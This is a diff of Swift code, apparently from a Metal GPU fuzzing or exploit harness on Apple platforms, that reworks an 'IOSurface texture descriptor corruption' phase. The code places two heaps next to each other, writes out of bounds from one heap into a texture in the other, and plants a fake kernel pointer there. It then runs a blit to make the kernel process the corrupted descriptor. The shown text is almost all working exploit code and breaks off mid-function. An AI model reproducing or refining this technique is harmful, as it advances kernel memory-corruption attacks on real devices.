@@ -601,35 +601,37 @@ func runPrecisionCorruption(log: FuzzLog, completion: @escaping () -> Void) {
 
         // ── Phase 2: IOSurface-backed texture corruption ──────────────────
         step("── Phase 2: IOSurface texture descriptor corruption ──")
-        // Alloc fresh adjacent pair for texture corruption (h1 is now spent)
         let hd2 = MTLHeapDescriptor(); hd2.size = 4096; hd2.storageMode = .shared; hd2.hazardTrackingMode = .untracked
         guard let hA = device.makeHeap(descriptor: hd2),
               let hB = device.makeHeap(descriptor: hd2) else { step("hA/hB nil"); completion(); return }
-        let actB = hA.size
+        let actB = hA.size  // = 16384
         guard let bA = hA.makeBuffer(length: actB, options: [.storageModeShared, .hazardTrackingModeUntracked]) else { step("bA nil"); completion(); return }
-        // Create IOSurface-backed texture in hB
-        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm, width: 64, height: 64, mipmapped: false)
-        td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]
-        guard let texB = hB.makeTexture(descriptor: td) else { step("texB nil — hB no space"); completion(); return }
         let pA = bA.contents().assumingMemoryBound(to: UInt8.self)
         let vaA = UInt(bitPattern: pA)
-        // Get texB's base VA — textures don't expose contents() but we know hB start
-        guard let probeB = hB.makeBuffer(length: 64, options: .storageModeShared) else { step("probeB nil"); completion(); return }
+
+        // Probe hB base VA FIRST — probeB occupies hB[0..4095] (Metal min alloc = 4096)
+        guard let probeB = hB.makeBuffer(length: 64, options: [.storageModeShared, .hazardTrackingModeUntracked]) else { step("probeB nil"); completion(); return }
         let vaB = UInt(bitPattern: probeB.contents())
         let distAB = vaB > vaA ? vaB - vaA : vaA - vaB
-        step("  hA va=0x\(String(vaA,radix:16)) hB va≈0x\(String(vaB,radix:16)) dist=0x\(String(distAB,radix:16))")
+        step("  vaA=0x\(String(vaA,radix:16)) vaBprobe=0x\(String(vaB,radix:16)) dist=0x\(String(distAB,radix:16))")
         guard distAB == UInt(actB) else { step("  hA/hB not adjacent — phase2 skip"); completion(); return }
-        step("  ✓ adjacent — texB lives in hB starting at 0x\(String(vaB,radix:16))")
+        step("  ✓ adjacent — hB[0] at 0x\(String(vaB,radix:16)) probeB fills hB[0..4095]")
 
-        // Fill texB region with sentinel via direct write to hB (via hA OOB)
-        for i in 0..<64 { pA[actB + i] = 0xCC }
-        step("  wrote 0xCC into hB[0..63] via hA OOB (texB descriptor region)")
+        // Texture goes at hB[4096] (probeB consumed hB[0..4095])
+        // 32×32 RGBA8 = 4096 bytes → fits in remaining 12288 bytes
+        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm, width: 32, height: 32, mipmapped: false)
+        td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]; td.hazardTrackingMode = .untracked
+        guard let texB = hB.makeTexture(descriptor: td) else { step("texB nil — hB no space"); completion(); return }
+        step("  texB created at hB[4096] (32×32 RGBA8)")
 
-        // Overwrite with fake IOSurface kernel ptrs at hB[0..31]
+        // OOB-write kptr into hB[4096..4127] (texB region) via hA OOB
+        // pA[actB + 4096] = vaA + 16384 + 4096 = vaB + 4096 = hB[4096] ✓
+        for i in 0..<64 { pA[actB + 4096 + i] = 0xCC }
+        step("  wrote 0xCC into hB[4096..4159] via hA OOB (texB region)")
         for off in stride(from: 0, to: 32, by: 8) {
-            for b in 0..<8 { pA[actB + off + b] = kptr[b] }
+            for b in 0..<8 { pA[actB + 4096 + off + b] = kptr[b] }
         }
-        step("  planted kptr 0xFFFFFFF000000008 at hB[0..31] (texB descriptor)")
+        step("  planted kptr 0xFFFFFFF000000008 at hB[4096..4127] (texB)")
 
         // Blit from texB → forces kernel to validate IOSurface/texture descriptor
         guard let dstTex = device.makeTexture(descriptor: td) else { step("dstTex nil"); completion(); return }
